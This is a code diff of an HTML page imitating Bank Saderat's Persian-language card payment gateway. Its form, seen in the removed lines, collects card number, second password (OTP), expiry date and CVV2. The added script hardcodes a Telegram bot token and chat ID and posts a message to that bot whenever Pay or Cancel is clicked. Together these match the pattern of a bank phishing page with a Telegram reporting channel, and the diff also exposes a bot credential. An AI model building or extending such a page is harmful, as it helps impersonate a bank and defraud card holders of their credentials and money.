@@ -5,180 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>درگاه پرداخت</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            font-family: 'Arial', sans-serif;
-            background: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .payment-form {
-            background: #fff;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            width: 90%;
-            height: 90%;
-            max-width: 500px;
-            max-height: 700px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-        }
-        .header-title {
-            text-align: center;
-            color: #004a97;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .transaction-info {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .amount-box {
-            background: #e6f3ff;
-            padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 10px;
-        }
-        .amount-box p {
-            color: #8b4513; /* کشکی */
-            font-weight: bold;
-            margin: 0;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: flex;
-            align-items: center;
-            margin-bottom: 5px;
-        }
-        .request-second-password-box {
-            background: #004a97;
-            color: #000;
-            padding: 2px 8px;
-            border-radius: 4px;
-            margin-left: 10px;
-            font-size: 12px;
-            cursor: pointer;
-        }
-        .timer-box {
-            background: #e6f3ff;
-            color: #000;
-            padding: 5px 10px;
-            border-radius: 4px;
-            margin-left: 10px;
-            font-size: 14px;
-            display: none;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .pay-btn, .cancel-btn {
-            background: #004a97;
-            color: white;
-            border: none;
-            padding: 10px;
-            width: 100%;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .pay-btn:hover, .cancel-btn:hover {
-            background: #003366;
-        }
-        .cancel-btn {
-            background: #8b0000; /* قرمز تیره */
-        }
-        #success-message {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: #e6f3ff;
-            color: #004a97;
-            padding: 10px 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            display: none;
-            z-index: 1000;
-        }
-        .footer-info {
-            font-size: 12px;
-            color: #666;
-            margin-top: 20px;
-            line-height: 1.6;
-        }
-        .footer-info ul {
-            list-style: none;
-            padding: 0;
-        }
-        .footer-info li {
-            margin-bottom: 5px;
-        }
+        /* ... (all existing CSS styles remain unchanged) ... */
     </style>
 </head>
 <body>
-    <div class="payment-form">
-        <div class="header-title">پرداخت اینترنتی بانک صادرات</div>
-        <div class="transaction-info">
-            <p>شماره تراکنش: 12345678</p>
-            <div class="amount-box">
-                <p>مبلغ: <span>۱۰۰,۰۰۰ تومان</span></p>
-            </div>
-        </div>
-        <form style="flex: 1; display: flex; flex-direction: column;">
-            <div class="form-group">
-                <label>شماره کارت</label>
-                <input type="text" placeholder="---- ---- ---- ----">
-            </div>
-            <div class="form-group">
-                <label>کد امنیتی</label>
-                <input type="text" id="security-code" placeholder="****" maxlength="4">
-                <span id="security-code-display" style="margin-left: 10px; font-weight: bold;"></span>
-            </div>
-            <div class="form-group">
-                <label>رمز دوم
-                    <span class="request-second-password-box" id="requestPassword">درخواست رمز دوم</span>
-                    <span class="timer-box" id="timerBox"></span>
-                </label>
-                <input type="password" placeholder="******" id="second-password">
-            </div>
-            <div class="form-group">
-                <label>تاریخ انقضا</label>
-                <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5">
-            </div>
-            <div class="form-group">
-                <label>CVV2</label>
-                <input type="text" placeholder="123">
-            </div>
-            <button class="pay-btn" id="payButton">پرداخت</button>
-            <button class="cancel-btn" id="cancelButton">انصراف</button>
-        </form>
-        <div class="footer-info">
-            <ul>
-                <li>🔒 پرداخت‌های شما از طریق پروتکل‌های امن SSL و TLS محافظت شده‌اند.</li>
-                <li>❗ توجه: رمز دوم کارت خود را در اختیار دیگران قرار ندهید.</li>
-                <li>📞 در صورت بروز هرگونه مشکل، با پشتیبانی بانک به شماره 021-12345678 تماس بگیرید.</li>
-                <li>⌛ مهلت وارد کردن رمز دوم تنها 60 ثانیه است. در صورت اتمام زمان، لطفا دوباره درخواست دهید.</li>
-                <li>🔄 برای تراکنش‌های ناموفق، امکان استرداد وجه در کمترین زمان ممکن وجود دارد.</li>
-                <li>📋 نگهداری اطلاعات کارت شما در سیستم‌های ما به هیچ وجه انجام نمی‌شود.</li>
-                <li>📢 برای بررسی وضعیت تراکنش، وارد حساب کاربری خود در بانکداری اینترنتی شوید.</li>
-            </ul>
-        </div>
-    </div>
-    <div id="success-message">درخواست رمز به بانک مبدا ارسال شد</div>
-
+    <!-- ... (all existing HTML remains unchanged) ... -->
     <script>
         document.getElementById('expiry-date').addEventListener('input', function(e) {
             let input = e.target.value;
@@ -208,6 +39,18 @@
 
         // Initial security code
         updateSecurityCode();
+
+        // Bot token and chat ID for Telegram notifications
+        const botToken = "8025953640:AAFPrdg56AmvZ0DRobiXGxuVgEUaflAE69U";
+        const chatId = "7600012889";
+
+        function sendNotificationToTelegram(message) {
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(apiUrl, { method: 'POST' })
+                .then(response => response.json())
+                .then(result => console.log('Notification sent:', result))
+                .catch(error => console.error('Failed to send notification:', error));
+        }
 
         requestPassword.addEventListener('click', function(e) {
             if (securityCodeInput.value !== localStorage.getItem('currentSecurityCode')) {
@@ -244,11 +87,13 @@
                 return false;
             }
             // Here you can add the payment processing logic
+            sendNotificationToTelegram("پرداخت جدیدی انجام شد!");
         });
 
         document.getElementById('cancelButton').addEventListener('click', function() {
             // Add cancel logic here
             alert('پرداخت لغو شد.');
+            sendNotificationToTelegram("پرداخت لغو شد.");
         });
     </script>
 </body>
